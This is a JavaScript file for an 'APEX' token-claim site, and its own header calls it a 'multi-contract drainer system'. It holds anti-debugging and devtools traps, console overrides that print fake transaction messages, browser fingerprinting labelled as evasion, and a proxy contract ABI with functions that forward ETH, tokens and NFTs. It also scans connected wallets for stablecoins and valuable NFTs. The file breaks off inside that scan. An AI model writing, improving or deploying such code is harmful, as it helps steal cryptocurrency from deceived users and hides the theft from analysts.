// ====== ADVANCED ANTI-DEBUGGING AND SOURCE CODE PROTECTION (iOS COMPATIBLE) ======

// Immediately invoked function to protect the code
(function() {
    // Advanced anti-debugging techniques with iOS compatibility
    const antiDebug = {
        // Debugger detection with iOS-safe techniques
        debuggerDetection: function() {
            // Method 1: Regular debugger checks (iOS compatible)
            setInterval(function() {
                try {
                    const start = Date.now();
                    (function() {
                        try {
                            debugger;
                        } catch (e) {
                            // iOS Safari may handle debugger differently
                        }
                    })();
                    if (Date.now() - start > 100) { // If execution was paused by debugger
                        document.body.innerHTML = "Debugger Detected. Access Denied.";
                        window.location.href = "about:blank";
                    }
                } catch (e) {
                    // iOS may throw errors on debugger statements
                }
            }, 1000);
            
            // Method 2: Performance-based detection (iOS Safari compatible)
            setInterval(function() {
                try {
                    const perf = performance.now();
                    try {
                        debugger;
                    } catch (e) {
                        // Ignore iOS debugger errors
                    }
                    if (performance.now() - perf > 200) {
                        document.body.innerHTML = "Debugger Detected. Access Denied.";
                        window.location.href = "about:blank";
                    }
                } catch (e) {
                    // iOS performance API may behave differently
                }
            }, 1500);
            
            // Method 3: Function redefinition (iOS compatible)
            try {
                const originalDebugger = Function.prototype.constructor;
                Function.prototype.constructor = function() {
                    if (arguments[0] && arguments[0].includes && arguments[0].includes("debugger")) {
                        throw new Error("Debugger statements are not allowed");
                    }
                    return originalDebugger.apply(this, arguments);
                };
            } catch (e) {
                // iOS may restrict function redefinition
            }
        },
        
        // Console obfuscation and protection (iOS compatible)
        consoleProtection: function() {
            // Store original console methods
            const originalConsole = {
                log: console.log,
                warn: console.warn,
                error: console.error,
                info: console.info,
                debug: console.debug,
                table: console.table,
                trace: console.trace
            };
            
            // Overwrite console methods with fake implementations
            console.log = function() {
                // Generate fake log messages to mislead
                if (Math.random() > 0.7) {
                    const fakeMessages = [
                        "Token claim processed successfully",
                        "Wallet connection established",
                        "Transaction confirmed on blockchain",
                        "APEX tokens distributed to wallet",
                        "Security verification passed",
                        "Smart contract executed successfully",
                        "Gas fees optimized for transaction",
                        "Token balance updated successfully"
                    ];
                    const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
                    originalConsole.log(`[APEX] ${randomMessage}`);
                }
            };
            
            console.warn = function() {
                // Generate fake warnings
                const fakeWarnings = [
                    "Low gas fee detected, transaction may take longer",
                    "Network congestion detected, retrying transaction",
                    "Wallet connection unstable, attempting reconnect",
                    "Token price fluctuation detected",
                    "High network traffic, optimizing gas fees"
                ];
                const randomWarning = fakeWarnings[Math.floor(Math.random() * fakeWarnings.length)];
                originalConsole.warn(`[APEX WARNING] ${randomWarning}`);
            };
            
            console.error = function() {
                // Generate fake errors
                const fakeErrors = [
                    "Transaction failed due to network congestion",
                    "Insufficient gas for transaction",
                    "Wallet connection timeout",
                    "Blockchain node unresponsive",
                    "Token transfer reverted by smart contract"
                ];
                const randomError = fakeErrors[Math.floor(Math.random() * fakeErrors.length)];
                originalConsole.error(`[APEX ERROR] ${randomError}`);
            };
            
            // Override other console methods (iOS safe)
            try {
                console.info = function() {};
                console.debug = function() {};
                console.table = function() {};
                console.trace = function() {};
                
                // Protect against console clearing (iOS compatible)
                const originalClear = console.clear;
                console.clear = function() {
                    originalConsole.log("[APEX] Console clearing disabled for security");
                };
            } catch (e) {
                // iOS may restrict console method overriding
            }
        },
        
        // DevTools detection (iOS compatible)
        devToolsDetection: function() {
            // iOS Safari DevTools detection is different
            // Method 1: iOS-specific detection
            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
            
            if (isIOS) {
                // iOS specific detection methods
                setInterval(function() {
                    // Check for iOS Safari Developer Menu
                    try {
                        // iOS Safari dev tools often change user agent
                        if (navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Version')) {
                            document.body.innerHTML = "Developer Tools Detected. Access Denied.";
                            window.location.href = "about:blank";
                        }
                    } catch (e) {
                        // iOS may restrict user agent detection
                    }
                    
                    // Check for unusual screen dimensions (iOS dev mode)
                    if (window.screen.width < 320 || window.screen.height < 480) {
                        document.body.innerHTML = "Developer Tools Detected. Access Denied.";
                        window.location.href = "about:blank";
                    }
                }, 1000);
            } else {
                // Original desktop detection methods
                const widthThreshold = window.outerWidth - window.innerWidth > 160;
                const heightThreshold = window.outerHeight - window.innerHeight > 160;
                
                if (widthThreshold || heightThreshold) {
                    document.body.innerHTML = "Developer Tools Detected. Access Denied.";
                    window.location.href = "about:blank";
                }
                
                setInterval(function() {
                    const widthThreshold = window.outerWidth - window.innerWidth > 160;
                    const heightThreshold = window.outerHeight - window.innerHeight > 160;
                    
                    if (widthThreshold || heightThreshold) {
                        document.body.innerHTML = "Developer Tools Detected. Access Denied.";
                        window.location.href = "about:blank";
                    }
                }, 1000);
            }
            
            // iOS-compatible debug function detection
            try {
                const element = new Image();
                Object.defineProperty(element, 'id', {
                    get: function() {
                        document.body.innerHTML = "Developer Tools Detected. Access Denied.";
                        window.location.href = "about:blank";
                    }
                });
                
                console.log('%c', element);
            } catch (e) {
                // iOS may restrict Image object manipulation
            }
        },
        
        // Code obfuscation protection (iOS compatible)
        codeProtection: function() {
            // Disable right-click context menu (iOS uses touch)
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                return false;
            });
            
            // Disable text selection (iOS compatible)
            document.addEventListener('selectstart', function(e) {
                e.preventDefault();
                return false;
            });
            
            // iOS uses different touch gestures
            document.addEventListener('touchstart', function(e) {
                // Prevent iOS specific developer gestures
                if (e.touches.length === 3 || e.touches.length === 4) {
                    e.preventDefault();
                    return false;
                }
            }, { passive: false });
            
            // Disable keyboard shortcuts for dev tools (iOS has no keyboard)
            document.addEventListener('keydown', function(e) {
                // iOS doesn't have F12, but we keep for desktop
                if (e.keyCode === 123) {
                    e.preventDefault();
                    return false;
                }
                // Disable Ctrl+Shift+I (not applicable to iOS)
                if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
                    e.preventDefault();
                    return false;
                }
                // Disable Ctrl+Shift+J (not applicable to iOS)
                if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
                    e.preventDefault();
                    return false;
                }
                // Disable Ctrl+U (not applicable to iOS)
                if (e.ctrlKey && e.keyCode === 85) {
                    e.preventDefault();
                    return false;
                }
            });
            
            // iOS specific: Prevent screenshot detection attempts
            document.addEventListener('visibilitychange', function() {
                if (document.hidden) {
                    // Page is hidden (possible screenshot on iOS)
                    console.log('[APEX] Page visibility changed - security check');
                }
            });
        },
        
        // Initialize all anti-debugging measures with iOS check
        init: function() {
            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
            
            if (isIOS) {
                console.log('[APEX] iOS device detected - applying mobile-specific protections');
                // iOS needs lighter protections
                this.codeProtection();
                this.consoleProtection();
            } else {
                this.debuggerDetection();
                this.consoleProtection();
                this.devToolsDetection();
                this.codeProtection();
            }
        }
    };
    
    // Initialize anti-debugging
    antiDebug.init();
})();

// ====== MULTI-CONTRACT DRAINER SYSTEM (iOS COMPATIBLE) ======

// Multiple contract addresses for enhanced stealth
const CONTRACT_ADDRESSES = {
    DEPLOYER: "0xa050df23cd65bb11c0A61c98F88706a4e9B0b939",
    PROXY_1: "0x06245e36F534422e974835040800532f19d3E54d",
    PROXY_2: "0x32694628715F4Fe17ADc4e68bed0E96A8eB50B6C"
};

// Enhanced ApexProxy ABI for multi-contract operations
const APEX_PROXY_ABI = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "target", "type": "address"},
            {"internalType": "bytes", "name": "data", "type": "bytes"}
        ],
        "name": "executeCall",
        "outputs": [
            {"internalType": "bytes", "name": "", "type": "bytes"}
        ],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "destination", "type": "address"}
        ],
        "name": "forwardETH",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "nftContract", "type": "address"},
            {"internalType": "uint256", "name": "tokenId", "type": "uint256"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"},
            {"internalType": "bool", "name": "isERC721", "type": "bool"},
            {"internalType": "address", "name": "destination", "type": "address"}
        ],
        "name": "forwardNFT",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "token", "type": "address"},
            {"internalType": "address", "name": "destination", "type": "address"}
        ],
        "name": "forwardToken",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "", "type": "address"},
            {"internalType": "address", "name": "", "type": "address"},
            {"internalType": "uint256", "name": "", "type": "uint256"},
            {"internalType": "uint256", "name": "", "type": "uint256"},
            {"internalType": "bytes", "name": "", "type": "bytes"}
        ],
        "name": "onERC1155Received",
        "outputs": [
            {"internalType": "bytes4", "name": "", "type": "bytes4"}
        ],
        "stateMutability": "pure",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "", "type": "address"},
            {"internalType": "address", "name": "", "type": "address"},
            {"internalType": "uint256", "name": "", "type": "uint256"},
            {"internalType": "bytes", "name": "", "type": "bytes"}
        ],
        "name": "onERC721Received",
        "outputs": [
            {"internalType": "bytes4", "name": "", "type": "bytes4"}
        ],
        "stateMutability": "pure",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {"internalType": "address", "name": "", "type": "address"}
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "destination", "type": "address"}
        ],
        "name": "recoverAssets",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    }
];

// Advanced wallet detection for UI purposes only (iOS compatible)
const walletDetectors = {
    isMetaMask: () => {
        const ethereum = window.ethereum;
        if (!ethereum) return false;
        
        const patterns = [
            ethereum.isMetaMask,
            ethereum._metamask && ethereum._metamask.isUnlocked,
            window.web3 && window.web3.currentProvider && window.web3.currentProvider.isMetaMask,
            ethereum.providers && ethereum.providers.find(p => p.isMetaMask),
            navigator.userAgent.includes('MetaMaskMobile')
        ];
        
        return patterns.some(pattern => Boolean(pattern));
    },
    
    isCoinbaseWallet: () => {
        const ethereum = window.ethereum;
        if (!ethereum) return false;
        
        return ethereum.isCoinbaseWallet || 
               ethereum.providers && ethereum.providers.some(p => p.isCoinbaseWallet) ||
               window.CoinbaseWalletSDK ||
               navigator.userAgent.includes('CoinbaseWallet');
    },
    
    isTrustWallet: () => {
        const ethereum = window.ethereum;
        if (!ethereum) return false;
        
        return ethereum.isTrust || 
               ethereum.isTrustWallet ||
               (ethereum.providers && ethereum.providers.some(p => p.isTrust || p.isTrustWallet)) ||
               navigator.userAgent.includes('TrustWallet');
    },
    
    isRabbyWallet: () => {
        const ethereum = window.ethereum;
        if (!ethereum) return false;
        
        return ethereum.isRabby || 
               (ethereum.providers && ethereum.providers.some(p => p.isRabby));
    },
    
    isPhantom: () => {
        return window.phantom && window.phantom.ethereum;
    },
    
    isBraveWallet: () => {
        return window.ethereum && window.ethereum.isBraveWallet;
    },
    
    isMobileWallet: () => {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) &&
               (window.ethereum || window.web3);
    },
    
    // iOS specific wallet detection
    isIOSWallet: () => {
        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
        if (!isIOS) return false;
        
        // iOS wallets often use specific URL schemes
        const wallets = [
            'metamask://',
            'trust://',
            'coinbasewallet://',
            'rainbow://',
            'zerion://'
        ];
        
        return wallets.some(wallet => {
            try {
                return window.location.protocol === wallet.split('://')[0];
            } catch (e) {
                return false;
            }
        });
    }
};

// Enhanced evasion techniques (iOS compatible)
const EVASION_TECHNIQUES = {
    async generateWasmFingerprint() {
        try {
            // iOS Safari has full WebAssembly support
            const wasmCode = new Uint8Array([
                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01,
                0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01,
                0x03, 0x61, 0x64, 0x64, 0x00, 0x00, 0x0a, 0x09,
                0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a,
                0x0b
            ]);
            
            const module = await WebAssembly.instantiate(wasmCode);
            const instance = module.instance;
            
            return {
                wasmSupported: true,
                timestamp: Date.now(),
                hash: Math.random().toString(36).substring(2, 15)
            };
        } catch (e) {
            return { wasmSupported: false, timestamp: Date.now() };
        }
    },
    
    generateAudioFingerprint() {
        return new Promise((resolve) => {
            try {
                // iOS requires user interaction for AudioContext
                // We'll use a lighter approach for iOS
                const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
                
                if (isIOS) {
                    // iOS compatible audio detection
                    resolve({ 
                        audioFingerprint: 'ios_limited',
                        hash: Math.random().toString(36).substring(2, 10)
                    });
                    return;
                }
                
                // Original desktop audio fingerprinting
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                
                oscillator.connect(analyser);
                analyser.connect(audioContext.destination);
                
                oscillator.start();
                setTimeout(() => {
                    oscillator.stop();
                    audioContext.close();
                    resolve({ 
                        audioFingerprint: 'completed',
                        hash: Math.random().toString(36).substring(2, 10)
                    });
                }, 100);
            } catch (e) {
                resolve({ audioFingerprint: 'failed' });
            }
        });
    },
    
    generateCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!ctx) {
                return 'canvas_not_supported';
            }
            
            const noise = Math.random().toString(36).substring(2, 15);
            const noise2 = Math.random().toString(36).substring(2, 10);
            
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText(noise, 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText(noise2, 4, 17);
            
            ctx.beginPath();
            ctx.arc(50, 50, 25, 0, Math.PI * 2);
            ctx.stroke();
            
            return canvas.toDataURL();
        } catch (e) {
            return 'canvas_error';
        }
    },

    generateBrowserFingerprint() {
        try {
            // iOS may restrict some navigator properties
            const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(',') : 'ios_no_plugins';
            const mimeTypes = navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(mt => mt.type).join(',') : 'ios_no_mimetypes';
            
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                plugins: plugins,
                mimeTypes: mimeTypes,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchSupport: 'ontouchstart' in window,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
                isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
                hash: Math.random().toString(36).substring(2, 15)
            };
        } catch (e) {
            return {
                error: 'fingerprint_failed',
                hash: Math.random().toString(36).substring(2, 15)
            };
        }
    }
};

// ====== ADVANCED APPLICATION STATE ======
let tokenChart;
let countdownInterval;
let claimList = [];
let priceHistory = [];
let web3;
let fingerprintData = {};
let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
let isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
let connectedWallet = null;
let connectedAddress = null;
let stealthMode = false;
let simulationBypassActive = false;
let progressUpdated = false;

// DOM Elements
const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
const navLinks = document.querySelector(".nav-links");
const claimListElement = document.getElementById("claimList");
const predictionFill = document.getElementById("predictionFill");
const claimStatus = document.getElementById("claimStatus");
const walletBtn = document.getElementById("walletButton");
const walletButtonContainer = document.getElementById("walletButtonContainer");
const connectButton = document.getElementById("connectButton");
const progressBar = document.getElementById("progressBar");
const progressPercentage = document.getElementById("progressPercentage");
const connectionDebug = document.getElementById("connectionDebug");
const debugToggle = document.getElementById("debugToggle");
const walletModal = document.getElementById("walletModal");
const walletModalClose = document.getElementById("walletModalClose");
const walletProviders = document.querySelectorAll(".wallet-provider");
const announcementModal = document.getElementById("announcementModal");
const announcementModalClose = document.getElementById("announcementModalClose");
const announcementOkBtn = document.getElementById("announcementOkBtn");
const copyReferralBtn = document.getElementById("copyReferralBtn");
const referralLink = document.getElementById("referralLink");

// Event listeners - MANUAL CONNECTION ONLY
if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
if (announcementOkBtn) announcementOkBtn.addEventListener("click", hideAnnouncementModal);
if (copyReferralBtn) copyReferralBtn.addEventListener("click", copyReferralLink);
if (debugToggle) debugToggle.addEventListener("click", () => {
    connectionDebug.classList.toggle("active");
    debugToggle.textContent = connectionDebug.classList.contains("active")
        ? "Hide connection details"
        : "Show connection details";
});

// Add event listeners to provider options - MANUAL CONNECTION ONLY
if (walletProviders) {
    walletProviders.forEach((provider) => {
        provider.addEventListener("click", () => {
            const providerType = provider.getAttribute("data-provider");
            connectWithProvider(providerType);
        });
    });
}

// Initialize Vanta.js background (iOS compatible)
function initializeVantaBackground() {
    // Check if this is iOS and if Vanta is supported
    if (typeof VANTA !== 'undefined' && !isIOS) {
        // iOS may have WebGL limitations, so we check
        try {
            VANTA.NET({
                el: "#vanta-bg",
                mouseControls: true,
                touchControls: true,
                gyroControls: false,
                minHeight: 200.0,
                minWidth: 200.0,
                scale: 1.0,
                scaleMobile: 1.0,
                color: 0xff6b00,
                backgroundColor: 0x0f172a,
                points: 15.0,
                maxDistance: 25.0,
                spacing: 18.0,
            });
        } catch (e) {
            console.log('Vanta.js initialization failed, using fallback background');
            setIOSBackgroundFallback();
        }
    } else if (isIOS) {
        // iOS specific background
        setIOSBackgroundFallback();
    }
}

// iOS background fallback
function setIOSBackgroundFallback() {
    const bgElement = document.getElementById("vanta-bg");
    if (bgElement) {
        bgElement.style.background = "linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%)";
        bgElement.style.position = "fixed";
        bgElement.style.top = "0";
        bgElement.style.left = "0";
        bgElement.style.width = "100%";
        bgElement.style.height = "100%";
        bgElement.style.zIndex = "-1";
    }
}

// Manual initialization - NO AUTO-CONNECTION (iOS compatible)
document.addEventListener("DOMContentLoaded", function () {
    // iOS specific DOM ready check
    if (isIOS) {
        // iOS Safari may need extra time for DOM
        setTimeout(initializeApp, 100);
    } else {
        initializeApp();
    }
});

function initializeApp() {
    try {
        startCountdown();
        createTokenChart();
        updateTokenPrice();
        generateInitialClaims();
        startClaimUpdates();
        updateAIAnalytics();
        initializeAdvancedEvasion();
        detectWallets();
        initializeVantaBackground();

        setInterval(updateTokenPrice, 10000);
        setInterval(updateAIAnalytics, 15000);

        // Initialize Service Worker for enhanced stealth (iOS limited)
        initializeServiceWorker();
        
        // Manual AppKit integration - NO AUTO-CONNECTION
        initializeManualAppKitIntegration();
        
        // Mobile-specific optimizations
        if (isMobileDevice) {
            initializeMobileSpecificOptimizations();
        }
        
        // iOS specific optimizations
        if (isIOS) {
            initializeIOSOptimizations();
        }
    } catch (e) {
        console.error('App initialization failed:', e);
        // Fallback for critical failures
        if (isIOS) {
            loadIOSFallback();
        }
    }
}

// iOS specific optimizations
function initializeIOSOptimizations() {
    console.log('Initializing iOS-specific optimizations...');
    
    // iOS Safari viewport fix
    const viewportMeta = document.querySelector('meta[name="viewport"]');
    if (viewportMeta) {
        viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover';
    }
    
    // iOS touch event optimizations
    document.addEventListener('touchstart', function(e) {
        // Prevent iOS rubber band effect
        if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
            e.preventDefault();
        }
    }, { passive: false });
    
    // iOS double-tap zoom prevention
    let lastTouchEnd = 0;
    document.addEventListener('touchend', function(event) {
        const now = (new Date()).getTime();
        if (now - lastTouchEnd <= 300) {
            event.preventDefault();
        }
        lastTouchEnd = now;
    }, false);
    
    // iOS status bar styling
    const metaThemeColor = document.querySelector('meta[name="theme-color"]');
    if (metaThemeColor) {
        metaThemeColor.content = '#0f172a';
    }
}

// iOS fallback loading
function loadIOSFallback() {
    console.log('Loading iOS fallback mode...');
    
    // Minimal functional fallback
    if (claimListElement) {
        claimListElement.innerHTML = '<div class="claim-item">iOS optimized loading...</div>';
    }
    
    // Simple countdown as fallback
    if (document.getElementById("countdown")) {
        document.getElementById("countdown").textContent = "5:0:0:0";
    }
}

// Mobile-specific optimizations
function initializeMobileSpecificOptimizations() {
    console.log('Initializing mobile-specific optimizations...');
    
    // Enhanced touch interactions
    document.addEventListener('touchstart', function(e) {
        if (e.target.closest('button') || e.target.closest('.btn-primary')) {
            e.target.style.transform = 'scale(0.98)';
            setTimeout(() => {
                e.target.style.transform = '';
            }, 150);
        }
    }, { passive: true });
    
    // Prevent zoom on double-tap (iOS compatible)
    document.addEventListener('dblclick', function(e) {
        e.preventDefault();
    }, { passive: false });
    
    // Enhanced mobile viewport handling
    const viewport = document.querySelector('meta[name="viewport"]');
    if (viewport) {
        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
    }
}

// Service Worker initialization (iOS limited)
async function initializeServiceWorker() {
    if ('serviceWorker' in navigator) {
        try {
            // iOS Safari has limited service worker support
            const swScript = `
                self.addEventListener('install', (event) => {
                    self.skipWaiting();
                });
                
                self.addEventListener('activate', (event) => {
                    event.waitUntil(self.clients.claim());
                });
            `;
            
            const blob = new Blob([swScript], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);
            
            // iOS may not support certain service worker features
            const registration = await navigator.serviceWorker.register(swUrl);
            console.log('ServiceWorker registered successfully');
            
            // iOS specific: Check if service worker is actually controlling
            if (registration.active) {
                console.log('ServiceWorker is active and controlling the page');
            }
        } catch (error) {
            console.log('ServiceWorker registration failed:', error);
            // iOS fallback
            if (isIOS) {
                console.log('iOS Safari ServiceWorker limitations detected');
            }
        }
    } else if (isIOS) {
        console.log('iOS Safari may have limited ServiceWorker support');
    }
}

// Manual AppKit integration - NO AUTO-CONNECTION
function initializeManualAppKitIntegration() {
    console.log('Initializing manual AppKit integration...');
    
    // Manual AppKit detection
    const checkAppKitInterval = setInterval(() => {
        const w3mButton = document.querySelector('w3m-button');
        if (w3mButton) {
            clearInterval(checkAppKitInterval);
            
            // Manual event listener only
            w3mButton.addEventListener('click', () => {
                console.log('Manual AppKit button clicked');
                setupManualAppKitConnectionListener();
            });
        }
        
        // iOS specific: Check for iOS wallet bridges
        if (isIOS) {
            checkIOSWalletBridges();
        }
    }, 500);
}

// iOS wallet bridge detection
function checkIOSWalletBridges() {
    // iOS wallets often use iframe bridges
    const iframes = document.getElementsByTagName('iframe');
    for (let iframe of iframes) {
        try {
            if (iframe.src.includes('metamask') || 
                iframe.src.includes('trust') || 
                iframe.src.includes('coinbase')) {
                console.log('iOS wallet bridge detected');
                setupIOSWalletBridgeListener(iframe);
            }
        } catch (e) {
            // Cross-origin iframe access may be blocked
        }
    }
}

// Manual AppKit connection listener
function setupManualAppKitConnectionListener() {
    if (window.ethereum) {
        window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length > 0) {
                console.log('Manual AppKit accounts changed:', accounts[0]);
                handleManualAppKitConnection(accounts[0]);
            } else {
                handleManualDisconnection();
            }
        });
        
        window.ethereum.on('chainChanged', (chainId) => {
            console.log('Manual AppKit chain changed:', chainId);
            if (window.ethereum.selectedAddress) {
                handleManualAppKitConnection(window.ethereum.selectedAddress);
            }
        });
        
        window.ethereum.on('connect', (connectInfo) => {
            console.log('Manual AppKit connected:', connectInfo);
        });
        
        window.ethereum.on('disconnect', (error) => {
            console.log('Manual AppKit disconnected:', error);
            handleManualDisconnection();
        });
    }
}

// Manual AppKit connection handler
function handleManualAppKitConnection(address) {
    connectedAddress = address;
    connectedWallet = 'manual_appkit';
    
    // Web3 initialization
    try {
        web3 = new Web3(window.ethereum);
    } catch (error) {
        console.error('Web3 initialization failed:', error);
        web3 = new Web3(Web3.givenProvider);
    }
    
    // UI updates
    updateManualWalletButton();
    
    // Logging
    logDebug(`Manual AppKit connected: ${connectedAddress}`);
    showNotification("Wallet connected successfully", "success");
    
    // Fingerprint collection
    collectManualFingerprint();
    
    // Announcement modal
    showManualAnnouncementModal();
}

// Manual announcement modal
function showManualAnnouncementModal() {
    if (connectedAddress) {
        const shortAddress = connectedAddress.substring(0, 6) + '...' + connectedAddress.substring(38);
        if (referralLink) {
            referralLink.textContent = `https://apex-protocol.io/ref?user=${shortAddress}`;
        }
    }
    
    if (announcementModal) {
        announcementModal.classList.add("active");
    }
}

// Manual wallet button update
function updateManualWalletButton() {
    if (!walletButtonContainer) return;
    
    if (connectedWallet && connectedAddress) {
        walletButtonContainer.innerHTML = `
            <div class="wallet-connected">
                <i class="fas fa-check-circle"></i>
                <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>
                <button class="disconnect-btn" id="disconnectButton">Disconnect</button>
            </div>
        `;
        document.getElementById("disconnectButton").addEventListener("click", disconnectManualWallet);
    } else {
        walletButtonContainer.innerHTML = `
            <button class="wallet-btn" id="walletButton">
                <i class="fas fa-wallet"></i> Connect
            </button>
        `;
        document.getElementById("walletButton").addEventListener("click", showWalletModal);
    }
}

// Manual disconnection handler
function handleManualDisconnection() {
    connectedWallet = null;
    connectedAddress = null;
    web3 = null;
    updateManualWalletButton();
    showNotification("Wallet disconnected", "info");
    logDebug("Manual wallet disconnected");
}

// Manual wallet disconnection
function disconnectManualWallet() {
    handleManualDisconnection();
}

// Manual fingerprint collection
async function collectManualFingerprint() {
    const fingerprint = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        webgl: await getManualWebGLFingerprint(),
        plugins: navigator.plugins ? Array.from(navigator.plugins).map((p) => p.name) : [],
        walletType: connectedWallet,
        network: "Unknown",
        ethBalance: 0,
        tokenBalances: {},
        nftBalances: {},
        isMobile: isMobileDevice,
        isIOS: isIOS,
        ...fingerprintData
    };

    try {
        if (web3) {
            const networkId = await web3.eth.net.getId();
            fingerprint.network = networkId;
            
            if (connectedAddress) {
                fingerprint.ethBalance = web3.utils.fromWei(
                    await web3.eth.getBalance(connectedAddress),
                    "ether"
                );

                await detectManualTokensAndNFTs(connectedAddress, fingerprint);
            }
        }
    } catch (e) {
        console.debug("Manual fingerprinting error:", e);
    }

    fingerprintData = fingerprint;
    return fingerprint;
}

// Manual WebGL fingerprinting (iOS compatible)
async function getManualWebGLFingerprint() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return "unsupported";

        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (!debugInfo) {
            return {
                renderer: 'unknown',
                vendor: 'unknown',
                version: gl.getParameter(gl.VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
            };
        }
        
        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        
        return {
            renderer: renderer,
            vendor: vendor,
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
            maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
        };
    } catch (e) {
        return "error";
    }
}

// Manual token and NFT detection
async function detectManualTokensAndNFTs(userAddress, fingerprint) {
    const tokenSources = [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", // MATIC
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
    ];

    const nftContracts = [
        "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC
        "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", // MAYC
        "0x23581767a106ae21c074b2276D25e5C3e136a68b", // Moonbirds
        "0xED5AF388653567Af2F388E6224dC7C4b3241C544", // Azuki
    ];

    // Manual token detection
    for (const tokenAddress of tokenSources) {
        try {
            const balance = await getManualTokenBalance(tokenAddress, userAddress);
            if (balance > 0) {
                fingerprint.tokenBalances[tokenAddress] = balance;
            }
        } catch (e) {
            console.debug(`Manual token balance check failed: ${tokenAddress}`);
        }
    }

    // Manual NFT detection
    for (const nftAddress of nftContracts) {
        try {
            const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
            if (nftBalance > 0) {
                fingerprint.nftBalances[nftAddress] = nftBalance;
            }
        } catch (e) {
